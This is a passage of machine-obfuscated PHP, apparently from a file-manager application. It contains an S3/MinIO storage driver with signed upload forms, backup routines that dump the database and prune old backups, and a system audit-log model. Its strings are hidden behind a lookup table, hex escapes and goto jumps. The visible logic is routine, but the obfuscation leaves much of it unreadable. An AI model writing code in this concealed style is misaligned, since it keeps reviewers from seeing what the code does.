size($ĞŸÆÉ‰½) { $Ğ³áË® = $this->objectMeta($ĞŸÆÉ‰½); return $Ğ³áË® ? $Ğ³áË®[$_SERVER[³Ôà×Ó][79]] : 0; } public function info($‰É„Ÿç) { if ($this->isFolder($‰É„Ÿç)) { return $this->folderInfo($‰É„Ÿç); } else { if ($this->isFile($‰É„Ÿç)) { return $this->fileInfo($‰É„Ÿç); } } return !1; } public function exist($î¼”Õ) { return $this->isFile($î¼”Õ) || $this->isFolder($î¼”Õ); } public function isFile($ò…Ï’) { return !$this->isFolder($ò…Ï’) && $this->objectMeta($ò…Ï’); } public function isFolder($„â‚ˆ¶¯) { return $this->cacheMethod($_SERVER[³Ôà×Ó][179], $„â‚ˆ¶¯); } protected function objectMeta($ÏÎş³È) { return $this->cacheMethod($_SERVER[³Ôà×Ó][181], $ÏÎş³È); } protected function _objectMeta($ªô®­šŒ) { $“÷²öÈ§ =& $_SERVER[³Ôà×Ó]; $ªô®­šŒ = rtrim($ªô®­šŒ, $“÷²öÈ§[8]); try { $¤ı¶û® = $this->client->getObjectInfo($this->bucket, $ªô®­šŒ); if (!isset($¤ı¶û®[$“÷²öÈ§[252]]) && isset($¤ı¶û®[$“÷²öÈ§[268]])) { $¤ı¶û®[$“÷²öÈ§[252]] = $¤ı¶û®[$“÷²öÈ§[268]]; } } catch (Exception $½­É¾¬˜) { $¤ı¶û® = !1; } if (!$¤ı¶û®) { } return $¤ı¶û®; } protected function _isFolder($üş²ÖÆ«) { $Ì¼¬ú¥ =& $_SERVER[³Ôà×Ó]; $üş²ÖÆ« = rtrim($üş²ÖÆ«, $Ì¼¬ú¥[8]); if ($üş²ÖÆ« == $Ì¼¬ú¥[12] || $üş²ÖÆ« == $Ì¼¬ú¥[8]) { return !0; } $¤À‘¹Ó = $this->client->getBucket($this->bucket, $üş²ÖÆ«, null, 1); if (empty($¤À‘¹Ó[$Ì¼¬ú¥[236]])) { return !1; } $ÑÔ ¶¶ = $¤À‘¹Ó[$Ì¼¬ú¥[236]][0][$Ì¼¬ú¥[32]]; return stripos($ÑÔ ¶¶, $üş²ÖÆ« . $Ì¼¬ú¥[8]) === 0 ? !0 : !1; if (substr($ÑÔ ¶¶, -1) == $Ì¼¬ú¥[8]) { return !0; } if (get_path_this($ÑÔ ¶¶) == get_path_this($üş²ÖÆ«)) { return !1; } return !0; } public function listObject($ïà ¥’ë) { return $this->fileList($ïà ¥’ë, $_SERVER[³Ôà×Ó][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($íÏ™‹ß) { $„ï’œÍÓ =& $_SERVER[³Ôà×Ó]; parent::__construct($íÏ™‹ß); $this->setSignVersion($„ï’œÍÓ[247]); if (!$this->region) { $this->region = $„ï’œÍÓ[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $–ğŒÜˆí = $this->getBucketRgn(); return $this->region == $–ğŒÜˆí ? !0 : !1; } public function uploadFormData($¹‹Â×”˜, $äÕËˆ¶ = 3600) { $˜Âîï ‹ =& $_SERVER[³Ôà×Ó]; $²–Æ”éª = $˜Âîï ‹[229]; $½ûÓı‚® = $˜Âîï ‹[270]; $õ°öîã® = $˜Âîï ‹[62]; $èüÈåå = gmdate($˜Âîï ‹[271]); $Ğ‰—ãú = gmdate($˜Âîï ‹[272]); $ğíóˆ² = $˜Âîï ‹[273]; $°Şõ¸˜ = $äÕËˆ¶ . $˜Âîï ‹[12]; $…¾Ì· = $˜Âîï ‹[274]; $£ö×ÃÈ† = array($this->accessKey, $Ğ‰—ãú, $this->region, $õ°öîã®, $ğíóˆ²); $¡÷Øª¼ = implode($˜Âîï ‹[8], $£ö×ÃÈ†); $±û“Ôò = array($˜Âîï ‹[275] => gmdate($˜Âîï ‹[276], strtotime($˜Âîï ‹[277])), $˜Âîï ‹[278] => array(array($˜Âîï ‹[279] => $this->bucket), array($˜Âîï ‹[280] => $²–Æ”éª), array($˜Âîï ‹[281], $˜Âîï ‹[282], $˜Âîï ‹[12]), array($˜Âîï ‹[281], $˜Âîï ‹[283], $˜Âîï ‹[12]), array($˜Âîï ‹[281], $˜Âîï ‹[284], $˜Âîï ‹[12]), array($˜Âîï ‹[285] => $…¾Ì·), array($˜Âîï ‹[286] => $¡÷Øª¼), array($˜Âîï ‹[287] => $½ûÓı‚®), array($˜Âîï ‹[288] => $èüÈåå), array($˜Âîï ‹[289] => $°Şõ¸˜))); $Ü£ †•Ü = base64_encode(json_encode($±û“Ôò)); $¬¨÷”Ì± = hash_hmac($˜Âîï ‹[290], $Ğ‰—ãú, $˜Âîï ‹[291] . $this->secret, !0); $°ªü«Î = hash_hmac($˜Âîï ‹[290], $this->region, $¬¨÷”Ì±, !0); $©Áø­£Æ = hash_hmac($˜Âîï ‹[290], $õ°öîã®, $°ªü«Î, !0); $µ¤“„³¦ = hash_hmac($˜Âîï ‹[290], $ğíóˆ², $©Áø­£Æ, !0); $Ğ¶·ºˆ = hash_hmac($˜Âîï ‹[290], $Ü£ †•Ü, $µ¤“„³¦); $¶‡”½‡‡ = array($˜Âîï ‹[246] => $˜Âîï ‹[12], $˜Âîï ‹[292] => $˜Âîï ‹[12], $˜Âîï ‹[280] => $²–Æ”éª, $˜Âîï ‹[285] => $…¾Ì·, $˜Âîï ‹[293] => $Ü£ †•Ü, $˜Âîï ‹[294] => $¡÷Øª¼, $˜Âîï ‹[295] => $½ûÓı‚®, $˜Âîï ‹[296] => $èüÈåå, $˜Âîï ‹[297] => $°Şõ¸˜, $˜Âîï ‹[298] => $Ğ¶·ºˆ, $˜Âîï ‹[208] => $this->getHost()); return $¶‡”½‡‡; } } goto D¤”À–«Ë; E‚ò’½¿íÀ: define($_SERVER[³Ôà×Ó][317], 3); define($_SERVER[³Ôà×Ó][318], 1); define($_SERVER[³Ôà×Ó][319], 0); goto ağ»õ…·åŞ; c¼„’—­: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[³Ôà×Ó][823]); $this->init(); $this->keep(); } public function init() { $¿àÉÀï =& $_SERVER[³Ôà×Ó]; $this->isManual(); self::$name = date($¿àÉÀï[824]); if (!($®¬ÍÊ†Ç = $this->model->lastItem())) { $®¬ÍÊ†Ç = $this->initData(); } else { self::$name = $®¬ÍÊ†Ç[$¿àÉÀï[32]]; if ($®¬ÍÊ†Ç[$¿àÉÀï[825]] == $¿àÉÀï[91]) { self::$name = date($¿àÉÀï[272]); $Õ¡ß¤ = intval(_get($®¬ÍÊ†Ç, $¿àÉÀï[826], 0)); if (self::$manual == 0 && $®¬ÍÊ†Ç[$¿àÉÀï[32]] == self::$name) { $this->model->remove($®¬ÍÊ†Ç[$¿àÉÀï[484]]); } $®¬ÍÊ†Ç = $this->initData($Õ¡ß¤, $®¬ÍÊ†Ç[$¿àÉÀï[827]]); } else { $this->checkStore($®¬ÍÊ†Ç[$¿àÉÀï[827]]); } } self::$option = $®¬ÍÊ†Ç; } private function isManual() { $´¦†äš = _get($GLOBALS, $_SERVER[³Ôà×Ó][828], 0); $´¦†äš = intval($´¦†äš); self::$manual = $´¦†äš && $´¦†äš == 1 ? 1 : 0; } private function initData($¢Å˜¥øÈ = 0, $÷Äˆë÷‡ = '') { $ÖÙ„§Ş¾ =& $_SERVER[³Ôà×Ó]; $Ÿ›åÒÊê = $this->model->config(); if ($÷Äˆë÷‡ && $Ÿ›åÒÊê[$ÖÙ„§Ş¾[827]] != $÷Äˆë÷‡) { $¢Å˜¥øÈ = 0; } $this->checkStore($Ÿ›åÒÊê[$ÖÙ„§Ş¾[827]]); if (self::$manual == 1) { self::$name .= $ÖÙ„§Ş¾[11] . date($ÖÙ„§Ş¾[829]); } $¨’Ü¦ÑÍ = array($ÖÙ„§Ş¾[827] => $Ÿ›åÒÊê[$ÖÙ„§Ş¾[827]], $ÖÙ„§Ş¾[32] => self::$name, $ÖÙ„§Ş¾[825] => 0, $ÖÙ„§Ş¾[171] => $Ÿ›åÒÊê[$ÖÙ„§Ş¾[171]], $ÖÙ„§Ş¾[830] => self::$manual, $ÖÙ„§Ş¾[369] => array($ÖÙ„§Ş¾[831] => array($ÖÙ„§Ş¾[825] => 0), $ÖÙ„§Ş¾[832] => array($ÖÙ„§Ş¾[825] => 0, $ÖÙ„§Ş¾[833] => 0, $ÖÙ„§Ş¾[834] => 0, $ÖÙ„§Ş¾[33] => $ÖÙ„§Ş¾[12], $ÖÙ„§Ş¾[835] => 0, $ÖÙ„§Ş¾[836] => 0), $ÖÙ„§Ş¾[837] => array($ÖÙ„§Ş¾[825] => 0, $ÖÙ„§Ş¾[833] => 0, $ÖÙ„§Ş¾[834] => 0, $ÖÙ„§Ş¾[835] => 0, $ÖÙ„§Ş¾[836] => 0), $ÖÙ„§Ş¾[230] => array($ÖÙ„§Ş¾[825] => 0, $ÖÙ„§Ş¾[838] => 0, $ÖÙ„§Ş¾[839] => 0, $ÖÙ„§Ş¾[840] => 0, $ÖÙ„§Ş¾[841] => 0, $ÖÙ„§Ş¾[550] => $¢Å˜¥øÈ, $ÖÙ„§Ş¾[835] => 0, $ÖÙ„§Ş¾[836] => 0)), $ÖÙ„§Ş¾[835] => time(), $ÖÙ„§Ş¾[836] => 0); $»™ß€† = $this->model->insert($¨’Ü¦ÑÍ); $¨’Ü¦ÑÍ[$ÖÙ„§Ş¾[484]] = $»™ß€†; return $¨’Ü¦ÑÍ; } private function checkStore($Œµ‡§…ä) { $ÀäÌ¬Ä¥ = Model($_SERVER[³Ôà×Ó][842]); $Àê¡Óä„ = $ÀäÌ¬Ä¥->listData($Œµ‡§…ä); $ÀäÌ¬Ä¥->checkConfig($Àê¡Óä„); } public static function get() { if (!self::$option) { $û¦×ÀÚ´ = Model($_SERVER[³Ôà×Ó][823]); $Ğ¥çÙÖ = $û¦×ÀÚ´->findByName(self::$name); $û¦×ÀÚ´->parseContent($Ğ¥çÙÖ); self::$option = $Ğ¥çÙÖ; } return self::$option; } public static function set($Ë·Ô·Ú¦) { $Ï†ê§×÷ =& $_SERVER[³Ôà×Ó]; $ÎóïÍ±“ = self::get(); foreach ($Ë·Ô·Ú¦ as $óè‚Ã£ => $öİñµöô) { array_set_value($ÎóïÍ±“, $óè‚Ã£, $öİñµöô); } Model($Ï†ê§×÷[823])->update($ÎóïÍ±“[$Ï†ê§×÷[484]], $ÎóïÍ±“); self::$option = $ÎóïÍ±“; return self::$option; } public function keep() { $ÅŠ£²Ù =& $_SERVER[³Ôà×Ó]; $šÂ›³œñ = self::get(); if (_get($šÂ›³œñ, $ÅŠ£²Ù[843], 0) == $ÅŠ£²Ù[91]) { return; } $this->backupKeep($šÂ›³œñ); self::set(array($ÅŠ£²Ù[843] => 1)); } private function backupKeep($šëéÆß) { $Õ¯ÂÖñí =& $_SERVER[³Ôà×Ó]; if (self::$manual == 1) { return; } $ÏÓøŸÒ‡ = $this->model->listData(); if (empty($ÏÓøŸÒ‡)) { return; } $Ï¡ıÂÆ« = 0; $³´şÄç = array(); foreach ($ÏÓøŸÒ‡ as $œ›ïí¾É) { if ($Ï¡ıÂÆ« >= 7) { break; } $³´şÄç[] = $œ›ïí¾É[$Õ¯ÂÖñí[32]]; $Ï¡ıÂÆ«++; } for ($Ï¡ıÂÆ« = 0; $Ï¡ıÂÆ« < 12; $Ï¡ıÂÆ«++) { $³´şÄç[] = date($Õ¯ÂÖñí[844], strtotime("\x2d{$Ï¡ıÂÆ«}\x20\x6d\x6f\x6e\164\x68\163")); } $³´şÄç = array_unique($³´şÄç); $óİÖ«² = Model($Õ¯ÂÖñí[845])->get($Õ¯ÂÖñí[846]); foreach ($ÏÓøŸÒ‡ as $œ›ïí¾É) { if (isset($œ›ïí¾É[$Õ¯ÂÖñí[830]]) && $œ›ïí¾É[$Õ¯ÂÖñí[830]] == $Õ¯ÂÖñí[91]) { continue; } if (!empty($œ›ïí¾É[$Õ¯ÂÖñí[32]]) && in_array($œ›ïí¾É[$Õ¯ÂÖñí[32]], $³´şÄç)) { continue; } $this->model->remove($œ›ïí¾É[$Õ¯ÂÖñí[484]]); $•®¼€ = $this->backupPath($šëéÆß, $óİÖ«²); IO::remove($•®¼€, !1); } } private function backupPath($òÆàæ²³, $ºÌñšÒù = false) { $¶›‰„ƒÎ =& $_SERVER[³Ôà×Ó]; if (!$ºÌñšÒù) { $ºÌñšÒù = Model($¶›‰„ƒÎ[845])->get($¶›‰„ƒÎ[846]); } $üóçô¾¹ = $òÆàæ²³[$¶›‰„ƒÎ[32]]; $ƒÑ½¼åå = substr(md5($¶›‰„ƒÎ[847] . $ºÌñšÒù . $üóçô¾¹), 0, 8); return "\x7b\151\x6f\x3a{$òÆàæ²³[$¶›‰„ƒÎ[827]]}\x7d\57\144\141\164\x61\x62\x61\x73\x65\x2f\142\x61\143\x6b\x75\x70\x2f" . $üóçô¾¹ . $¶›‰„ƒÎ[11] . $ƒÑ½¼åå; } public function db() { $¢íÔÄÃ° =& $_SERVER[³Ôà×Ó]; $ÆÀ—€û¶ = self::get(); if (_get($ÆÀ—€û¶, $¢íÔÄÃ°[848], 0) == $¢íÔÄÃ°[91]) { return !0; } $ãÇÉˆÉú = new BackupDb(); if (!$ãÇÉˆÉú->index()) { return !1; } self::set(array($¢íÔÄÃ°[848] => 1)); return !0; } public function dbFile() { $ÎŠØºå­ =& $_SERVER[³Ôà×Ó]; $èÀËúç = self::get(); if (_get($èÀËúç, $ÎŠØºå­[849], 0) == $ÎŠØºå­[91]) { return !0; } $ İŸ“¼à = new BackupDbFile(); if (!$ İŸ“¼à->index()) { return !1; } self::set(array($ÎŠØºå­[849] => 1)); return !0; } public function file() { $·çƒ¥³³ =& $_SERVER[³Ôà×Ó]; $ª„Éí„‚ = self::get(); if (_get($ª„Éí„‚, $·çƒ¥³³[850], 0) == $·çƒ¥³³[91]) { return !0; } if ($ª„Éí„‚[$·çƒ¥³³[171]] == $·çƒ¥³³[851]) { $î¨¬¦ø = new BackupFile(); if (!$î¨¬¦ø->index()) { return !1; } } self::set(array($·çƒ¥³³[850] => 1, $·çƒ¥³³[825] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $®ö¡šºÎ =& $_SERVER[³Ôà×Ó]; $š«™óÑ = Backup::get(); self::$io = $š«™óÑ[$®ö¡šºÎ[827]]; self::$name = $š«™óÑ[$®ö¡šºÎ[32]]; $ÏÊîõĞÌ = new DbManage(); $¤„„²ä² = $ÏÊîõĞÌ->dbType(); $í’’…äº = array($®ö¡šºÎ[852] => $¤„„²ä², $®ö¡šºÎ[853] => time()); Backup::set($í’’…äº); $óü±‰Ûë = $this->tmpFilesPath() . $®ö¡šºÎ[854] . self::$name . $®ö¡šºÎ[8]; del_dir($óü±‰Ûë); mk_dir($óü±‰Ûë); $Ş¡³øÛÄ = $—Ù¹Û«ü = 0; try { $²Çù€ù = $ÏÊîõĞÌ->db()->getTables(); } catch (Exception $¦¬’‹·˜) { return !1; } $²Çù€ù = array_diff($²Çù€ù, array($®ö¡šºÎ[855], $®ö¡šºÎ[856])); foreach ($²Çù€ù as $­şËÖ’‚) { $Ş¡³øÛÄ += $ÏÊîõĞÌ->model($­şËÖ’‚)->count(); } $»ìÉŞ¯ƒ = new Task($®ö¡šºÎ[857], $®ö¡šºÎ[858], $Ş¡³øÛÄ, LNG($®ö¡šºÎ[859]) . $®ö¡šºÎ[860] . LNG($®ö¡šºÎ[861])); $GLOBALS[$®ö¡šºÎ[862]] = self::$name; foreach ($²Çù€ù as $­şËÖ’‚) { $…˜§¤ÒÔ = $óü±‰Ûë . $­şËÖ’‚ . $®ö¡šºÎ[863]; $°®ô½›¿ = null; if ($­şËÖ’‚ == $®ö¡šºÎ[864] && (!isset($š«™óÑ[$®ö¡šºÎ[171]]) || $š«™óÑ[$®ö¡šºÎ[171]] == $®ö¡šºÎ[228])) { $°®ô½›¿ = self::$io; } $—Ù¹Û«ü += $ÏÊîõĞÌ->sqlFromDb($­şËÖ’‚, $…˜§¤ÒÔ, $»ìÉŞ¯ƒ, $°®ô½›¿); } unset($GLOBALS[$®ö¡šºÎ[862]]); $»ìÉŞ¯ƒ->end(); if ($—Ù¹Û«ü > $Ş¡³øÛÄ) { $Ş¡³øÛÄ = $—Ù¹Û«ü; } $í’’…äº = array($®ö¡šºÎ[852] => $¤„„²ä², $®ö¡šºÎ[848] => 1, $®ö¡šºÎ[865] => $Ş¡³øÛÄ, $®ö¡šºÎ[866] => $—Ù¹Û«ü, $®ö¡šºÎ[867] => time()); Backup::set($í’’…äº); if ($Ş¡³øÛÄ - $—Ù¹Û«ü > 0) { $ã™Ê¹…› = $®ö¡šºÎ[868]; if (!stristr(I18n::getType(), $®ö¡šºÎ[869])) { $ã™Ê¹…› = $®ö¡šºÎ[870]; } write_log(array($ã™Ê¹…›, $í’’…äº), $®ö¡šºÎ[858]); return !1; } return !0; } private function tmpFilesPath() { $µ‡•Éó =& $_SERVER[³Ôà×Ó]; $šáÈºá = TEMP_FILES; if ($GLOBALS[$µ‡•Éó[6]][$µ‡•Éó[92]][$µ‡•Éó[871]]) { $šáÈºá = $GLOBALS[$µ‡•Éó[6]][$µ‡•Éó[92]][$µ‡•Éó[871]]; if (!mk_dir($šáÈºá) || !is_writable($šáÈºá) || !IO::mkfile($šáÈºá . $µ‡•Éó[872])) { $šáÈºá = TEMP_FILES; } } return $šáÈºá; } } class BackupDbFile { public function __construct() { } public function index() { $‰ÆŸßÑÇ =& $_SERVER[³Ôà×Ó]; $Éôª˜€• = Backup::get(); $âÊõ¼«é = $Éôª˜€•[$‰ÆŸßÑÇ[32]]; $ÕÄ´¹çŸ = $this->tmpFilesPath() . "\142\141\x63\x6b\x75\160\x5f{$âÊõ¼«é}\57"; $•ÆĞ’ŒÀ = $this->backupPath($Éôª˜€•); if (!($•ÆĞ’ŒÀ = IO::mkdir($•ÆĞ’ŒÀ))) { return !1; } $üÛ‡Å‹ä = IO::listPath($ÕÄ´¹çŸ); $—³õ¦… = isset($üÛ‡Å‹ä[$‰ÆŸßÑÇ[86]]) ? $üÛ‡Å‹ä[$‰ÆŸßÑÇ[86]] : array(); $ƒÔ¸Åïá = array_sum(array_column($—³õ¦…, $‰ÆŸßÑÇ[79])); if (!$ƒÔ¸Åïá) { return !1; } $„û€»¬¿ = array($‰ÆŸßÑÇ[873] => $ƒÔ¸Åïá, $‰ÆŸßÑÇ[874] => time()); Backup::set($„û€»¬¿); $üÓ´Ÿæ– = new TaskFileTransfer($‰ÆŸßÑÇ[875], $‰ÆŸßÑÇ[858], count($—³õ¦…), LNG($‰ÆŸßÑÇ[859]) . $‰ÆŸßÑÇ[471] . LNG($‰ÆŸßÑÇ[861]) . $‰ÆŸßÑÇ[876]); $üÓ´Ÿæ–->task[$‰ÆŸßÑÇ[838]] = $ƒÔ¸Åïá; foreach ($üÛ‡Å‹ä[$‰ÆŸßÑÇ[86]] as $ä°ùĞ¬ù) { $ö—ôçÂ¤ = IO::move($ä°ùĞ¬ù[$‰ÆŸßÑÇ[87]], $•ÆĞ’ŒÀ); if (!$ö—ôçÂ¤) { $üÓ´Ÿæ–->end(); $¡§¨¸ââ = IO::getLastError($‰ÆŸßÑÇ[877] . $ä°ùĞ¬ù[$‰ÆŸßÑÇ[87]] . $‰ÆŸßÑÇ[878] . $•ÆĞ’ŒÀ . $‰ÆŸßÑÇ[178]); write_log($¡§¨¸ââ, $‰ÆŸßÑÇ[858]); return !1; } } $­™Û¾Ÿ = new DbManage(); $ÛÖ“ÁÏÃ = $­™Û¾Ÿ->getSqlFile(); if (!$ÛÖ“ÁÏÃ[$‰ÆŸßÑÇ[879]] || !$ÛÖ“ÁÏÃ[$‰ÆŸßÑÇ[13]]) { return !1; } IO::move($ÛÖ“ÁÏÃ[$‰ÆŸßÑÇ[879]], $•ÆĞ’ŒÀ); IO::move($ÛÖ“ÁÏÃ[$‰ÆŸßÑÇ[13]], $•ÆĞ’ŒÀ); $üÓ´Ÿæ–->end(); $„û€»¬¿ = array($‰ÆŸßÑÇ[880] => $ƒÔ¸Åïá, $‰ÆŸßÑÇ[881] => time()); Backup::set($„û€»¬¿); return !0; } private function backupPath($ÆÔŸå™«) { $ıÚÒë‹ =& $_SERVER[³Ôà×Ó]; $Ñô‰ÇÍ» = $ÆÔŸå™«[$ıÚÒë‹[32]]; $²›ç¦å” = Model($ıÚÒë‹[845])->get($ıÚÒë‹[846]); $íÄ»×¨¼ = substr(md5($ıÚÒë‹[847] . $²›ç¦å” . $Ñô‰ÇÍ»), 0, 8); return "\173\x69\x6f\72{$ÆÔŸå™«[$ıÚÒë‹[827]]}\x7d\57\144\141\x74\x61\142\141\163\x65\57\x62\x61\x63\153\x75\160\x2f" . $Ñô‰ÇÍ» . $ıÚÒë‹[11] . $íÄ»×¨¼; } private function tmpFilesPath() { $·ù²Õ²§ =& $_SERVER[³Ôà×Ó]; $êÓÈü  = TEMP_FILES; if ($GLOBALS[$·ù²Õ²§[6]][$·ù²Õ²§[92]][$·ù²Õ²§[871]]) { $êÓÈü  = $GLOBALS[$·ù²Õ²§[6]][$·ù²Õ²§[92]][$·ù²Õ²§[871]]; if (!mk_dir($êÓÈü ) || !is_writable($êÓÈü ) || !IO::mkfile($êÓÈü  . $·ù²Õ²§[872])) { $êÓÈü  = TEMP_FILES; } } return $êÓÈü ; } } goto fê×ÖÏ‡Íß; b…£…î­: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\155\x5f\154\157\147"; protected $dataAuto = array(array("\x63\162\x65\x61\164\145\x54\151\x6d\145", "\x74\151\155\x65", "\x69\x6e\163\x65\x72\164", "\146\165\156\143\x74\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $“µâ³¬ =& $_SERVER[³Ôà×Ó]; return array($“µâ³¬[2323] => LNG($“µâ³¬[2324]), $“µâ³¬[2325] => LNG($“µâ³¬[2326]), $“µâ³¬[1906] => LNG($“µâ³¬[2327]), $“µâ³¬[2328] => LNG($“µâ³¬[2329]), $“µâ³¬[2330] => LNG($“µâ³¬[2331]), $“µâ³¬[2332] => LNG($“µâ³¬[2333]), $“µâ³¬[2334] => LNG($“µâ³¬[2335]), $“µâ³¬[1936] => LNG($“µâ³¬[2335]), $“µâ³¬[1937] => LNG($“µâ³¬[2336]), $“µâ³¬[2337] => LNG($“µâ³¬[2338]), $“µâ³¬[2339] => LNG($“µâ³¬[2340]), $“µâ³¬[2341] => LNG($“µâ³¬[2342]), $“µâ³¬[2343] => LNG($“µâ³¬[2344]), $“µâ³¬[1934] => LNG($“µâ³¬[2345]), $“µâ³¬[2346] => LNG($“µâ³¬[2347]), $“µâ³¬[1941] => LNG($“µâ³¬[2348]), $“µâ³¬[2349] => LNG($“µâ³¬[2350]), $“µâ³¬[2351] => LNG($“µâ³¬[2352]), $“µâ³¬[2353] => LNG($“µâ³¬[2354]), $“µâ³¬[2355] => LNG($“µâ³¬[2356]), $“µâ³¬[1944] => LNG($“µâ³¬[2357]), $“µâ³¬[1945] => LNG($“µâ³¬[2358]), $“µâ³¬[2359] => LNG($“µâ³¬[2360]), $“µâ³¬[2361] => LNG($“µâ³¬[2362]), $“µâ³¬[2363] => LNG($“µâ³¬[2364]), $“µâ³¬[1939] => LNG($“µâ³¬[2365]), $“µâ³¬[2366] => LNG($“µâ³¬[2367]), $“µâ³¬[1938] => LNG($“µâ³¬[2368]), $“µâ³¬[2369] => LNG($“µâ³¬[2370]), $“µâ³¬[2371] => LNG($“µâ³¬[2372]), $“µâ³¬[2373] => LNG($“µâ³¬[2372]), $“µâ³¬[2374] => LNG($“µâ³¬[2375]), $“µâ³¬[2376] => LNG($“µâ³¬[2376]), $“µâ³¬[2377] => LNG($“µâ³¬[1910]), $“µâ³¬[2378] => LNG($“µâ³¬[2379]), $“µâ³¬[2380] => LNG($“µâ³¬[2381]), $“µâ³¬[2382] => LNG($“µâ³¬[2383]), $“µâ³¬[2384] => LNG($“µâ³¬[2385]), $“µâ³¬[2386] => LNG($“µâ³¬[2387]), $“µâ³¬[2388] => LNG($“µâ³¬[2388]), $“µâ³¬[2389] => LNG($“µâ³¬[2390]), $“µâ³¬[2391] => LNG($“µâ³¬[2392]), $“µâ³¬[2393] => LNG($“µâ³¬[2394]), $“µâ³¬[2395] => LNG($“µâ³¬[2396]), $“µâ³¬[2397] => LNG($“µâ³¬[2398]), $“µâ³¬[2399] => LNG($“µâ³¬[2400]), $“µâ³¬[212] => LNG($“µâ³¬[212]), $“µâ³¬[213] => LNG($“µâ³¬[2401]), $“µâ³¬[2402] => LNG($“µâ³¬[2402])); } private function typeFile() { $Ô ÖÄİƒ =& $_SERVER[³Ôà×Ó]; $ÁØïÆ½Ó = array($Ô ÖÄİƒ[1941] => array($Ô ÖÄİƒ[1942]), $Ô ÖÄİƒ[2341] => array($Ô ÖÄİƒ[2403]), $Ô ÖÄİƒ[2343] => array($Ô ÖÄİƒ[2404]), $Ô ÖÄİƒ[1934] => array($Ô ÖÄİƒ[1935], $Ô ÖÄİƒ[2405]), $Ô ÖÄİƒ[2351] => array(), $Ô ÖÄİƒ[2353] => array(), $Ô ÖÄİƒ[2355] => array(), $Ô ÖÄİƒ[1944] => array($Ô ÖÄİƒ[1946]), $Ô ÖÄİƒ[1945] => array($Ô ÖÄİƒ[1946]), $Ô ÖÄİƒ[2359] => array($Ô ÖÄİƒ[2406]), $Ô ÖÄİƒ[2361] => array($Ô ÖÄİƒ[2406]), $Ô ÖÄİƒ[2363] => array($Ô ÖÄİƒ[2407]), $Ô ÖÄİƒ[2349] => array($Ô ÖÄİƒ[2408]), $Ô ÖÄİƒ[1939] => array($Ô ÖÄİƒ[2409]), $Ô ÖÄİƒ[2366] => array($Ô ÖÄİƒ[2410]), $Ô ÖÄİƒ[1938] => array($Ô ÖÄİƒ[1940])); return $ÁØïÆ½Ó; } private function typeAll() { $â‚ÏŠšƒ =& $_SERVER[³Ôà×Ó]; $º…Ÿö§ê = $this->typeList; $¬Óåø¦— = array_filter($this->typeFile()); foreach ($¬Óåø¦— as $õ¨–¸Ÿˆ => $™ÜæØß¶) { $º…Ÿö§ê[$™ÜæØß¶[0]] = $º…Ÿö§ê[$õ¨–¸Ÿˆ]; } $º…Ÿö§ê[$â‚ÏŠšƒ[1946]] = LNG($â‚ÏŠšƒ[2411]); $º…Ÿö§ê[$â‚ÏŠšƒ[2406]] = LNG($â‚ÏŠšƒ[2412]); return $º…Ÿö§ê; } public function addLog($ÚÖÙ—şé, $ù€ÖËü¿ = array()) { $‰„ûî¡Ñ =& $_SERVER[³Ôà×Ó]; if (!isset($this->typeList[$ÚÖÙ—şé])) { return; } $ÂØ¢ê®î = Session::get($‰„ûî¡Ñ[2104]); if (!$ÂØ¢ê®î) { $ÂØ¢ê®î = _get($ù€ÖËü¿, $‰„ûî¡Ñ[1765], 0); } if ($ÚÖÙ—şé == $‰„ûî¡Ñ[2378] && is_array($ù€ÖËü¿[$‰„ûî¡Ñ[2413]]) && !$ù€ÖËü¿[$‰„ûî¡Ñ[2413]]) { return; } $Âœˆ‰¥½ = get_client_ip(); if (!$ù€ÖËü¿ || strlen(json_encode($ù€ÖËü¿)) >= 1024 * 64) { if ($ù€ÖËü¿ && is_array($ù€ÖËü¿)) { $ù€ÖËü¿ = array_intersect_key($ù€ÖËü¿, array_flip($‰„ûî¡Ñ[484], $‰„ûî¡Ñ[32])); $ù€ÖËü¿[$‰„ûî¡Ñ[2414]] = $Âœˆ‰¥½; } else { $ù€ÖËü¿ = array($‰„ûî¡Ñ[2414] => $Âœˆ‰¥½); } } else { if (is_array($ù€ÖËü¿)) { $ù€ÖËü¿[$‰„ûî¡Ñ[2414]] = $Âœˆ‰¥½; } else { $ù€ÖËü¿ = array($‰„ûî¡Ñ[1284] => $ù€ÖËü¿, $‰„ûî¡Ñ[2414] => $Âœˆ‰¥½); } } $ù€ÖËü¿ = array($‰„ûî¡Ñ[1755] => Session::sign(), $‰„ûî¡Ñ[1756] => intval($ÂØ¢ê®î), $‰„ûî¡Ñ[33] => $ÚÖÙ—şé, $‰„ûî¡Ñ[1758] => json_encode($ù€ÖËü¿)); parent::add($ù€ÖËü¿); } public function remove($ŞºÃ²™¡) { $this->where(array($_SERVER[³Ôà×Ó][502] => $ŞºÃ²™¡))->delete(); } private function _makeOrder($Ï­¥İæá = '') { $ä§ÏĞ•Ş =& $_SERVER[³Ôà×Ó]; $‰€ÑÀè€ = $ä§ÏĞ•Ş[231]; $òÙë° = array($ä§ÏĞ•Ş[532] => $ä§ÏĞ•Ş[533], $ä§ÏĞ•Ş[534] => $ä§ÏĞ•Ş[535]); $ğ±’ˆ§¢ = Input::get($ä§ÏĞ•Ş[540], $ä§ÏĞ•Ş[7], $ä§ÏĞ•Ş[2140], array($ä§ÏĞ•Ş[2058], $ä§ÏĞ•Ş[534])); $ğ±’ˆ§¢ = $òÙë°[$ğ±’ˆ§¢]; $Ï­¥İæá = $Ï­¥İæá . "{$‰€ÑÀè€}\x20{$ğ±’ˆ§¢}"; return $this->order($Ï­¥İæá); } public function get($´¹ö·§é = '') { $áÇ¹‘® =& $_SERVER[³Ôà×Ó]; if (!$´¹ö·§é) { show_json(array()); } $Óù±ÅÀˆ = array(); if ($´¹ö·§é[$áÇ¹‘®[1765]]) { $Óù±ÅÀˆ[$áÇ¹‘®[1765]] = $´¹ö·§é[$áÇ¹‘®[1765]]; } if (isset($´¹ö·§é[$áÇ¹‘®[835]])) { $ÈòÓ®Æ = $´¹ö·§é[$áÇ¹‘®[835]]; $ÀÃÍê‡Ò = isset($´¹ö·§é[$áÇ¹‘®[836]]) ? 